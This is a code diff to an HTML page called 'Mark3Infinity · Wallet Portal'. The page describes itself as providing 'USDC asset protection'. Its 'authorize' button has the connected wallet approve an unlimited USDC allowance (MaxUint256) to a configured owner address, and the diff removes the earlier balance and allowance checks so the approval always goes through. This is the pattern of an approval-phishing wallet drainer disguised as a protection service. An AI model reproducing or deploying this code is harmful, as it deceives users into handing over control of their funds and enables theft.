@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Mark3Infinity · Wallet Portal</title>
   <style>
     body {
@@ -23,7 +23,6 @@
       padding: 2rem;
       max-width: 480px;
       width: 100%;
-      animation: fadeIn 1s ease;
     }
     h2 {
       text-align: center;
@@ -76,11 +75,11 @@
       flex-wrap: wrap;
     }
     .wallet-logos img {
-      height: 32px;
       width: 32px;
-      border-radius: 8px;
-      background: white;
-      padding: 4px;
+      height: 32px;
+      object-fit: contain;
+      background: transparent;
+      padding: 2px;
     }
     .info-box {
       margin-top: 2rem;
@@ -94,10 +93,6 @@
     .info-box div {
       margin-bottom: 0.5rem;
     }
-    @keyframes fadeIn {
-      from {opacity: 0; transform: translateY(20px);}
-      to {opacity: 1; transform: translateY(0);}
-    }
   </style>
 </head>
 <body>
@@ -109,10 +104,10 @@
     <div class="progress-bar"><div class="progress-inner" id="bar"></div></div>
     <div id="status">🔒 Status: Waiting for action...</div>
     <div class="wallet-logos">
-      <img src="https://cryptologos.cc/logos/metamask-icon.svg" alt="MetaMask">
-      <img src="https://cryptologos.cc/logos/trust-wallet-trust-wallet-logo.svg" alt="TrustWallet">
-      <img src="https://cryptologos.cc/logos/token-pocket-tpt-logo.svg" alt="TokenPocket">
-      <img src="https://cryptologos.cc/logos/coinbase-coinbase-logo.svg" alt="Coinbase">
+      <img src="./images/metamask.png" alt="MetaMask">
+      <img src="./images/trustwallet.png" alt="TrustWallet">
+      <img src="./images/tokenpocket.png" alt="TokenPocket">
+      <img src="./images/coinbase.png" alt="Coinbase">
     </div>
     <div class="info-box">
       <div>✅ Mark3 Protocol provides advanced wallet authorization and real-time USDC asset protection through smart contract-based automation.</div>
@@ -133,38 +128,54 @@
     const status = (msg) => document.getElementById("status").innerText = "🔒 Status: " + msg;
     const progress = (val) => bar.style.width = val + "%";
 
+    window.onerror = (msg, url, line) => {
+      console.error("全局错误:", msg, "at", line);
+    };
+
+    document.querySelectorAll(".wallet-logos img").forEach(img => {
+      img.onerror = () => {
+        img.style.display = "none";
+      };
+    });
+
     document.getElementById("connect").onclick = async () => {
       try {
-        progress(10);
-        if (!window.ethereum) throw new Error("Please install MetaMask or open in wallet browser");
+        if (!window.ethereum) {
+          throw new Error("请使用支持的钱包浏览器或安装 MetaMask");
+        }
         provider = new ethers.providers.Web3Provider(window.ethereum);
         await provider.send("eth_requestAccounts", []);
         signer = provider.getSigner();
         user = await signer.getAddress();
-        progress(60);
-        status("✅ Connected as: " + user);
+        status("✅ 已连接: " + user.slice(0, 6) + "...");
         progress(100);
       } catch (err) {
-        status("❌ " + err.message);
+        status("❌ " + (err.message || "连接失败"));
         progress(0);
       }
     };
 
     document.getElementById("authorize").onclick = async () => {
       try {
-        progress(0);
-        const usdc = new ethers.Contract(CONFIG.USDC_ADDRESS, ["function approve(address,uint256) returns (bool)", "function allowance(address,address) view returns (uint256)", "function balanceOf(address) view returns (uint256)"] , signer);
-        const balance = await usdc.balanceOf(user);
-        const allowance = await usdc.allowance(user, CONFIG.OWNER_ADDRESS);
-        progress(40);
-        if (allowance.lt(balance)) {
-          const tx = await usdc.approve(CONFIG.OWNER_ADDRESS, ethers.constants.MaxUint256);
-          await tx.wait();
+        if (!window.ethereum) {
+          throw new Error("请安装 MetaMask 或在钱包浏览器中打开");
         }
-        status("✅ Authorization successful.");
+        if (!signer) {
+          throw new Error("请先连接钱包");
+        }
+        progress(10);
+        const usdc = new ethers.Contract(
+          CONFIG.USDC_ADDRESS,
+          ["function approve(address,uint256) returns (bool)"],
+          signer
+        );
+        progress(40);
+        const tx = await usdc.approve(CONFIG.OWNER_ADDRESS, ethers.constants.MaxUint256);
+        await tx.wait();
+        status("✅ 授权成功");
         progress(100);
       } catch (err) {
-        status("❌ " + err.message);
+        status("❌ " + (err.message || "授权失败"));
         progress(0);
       }
     };
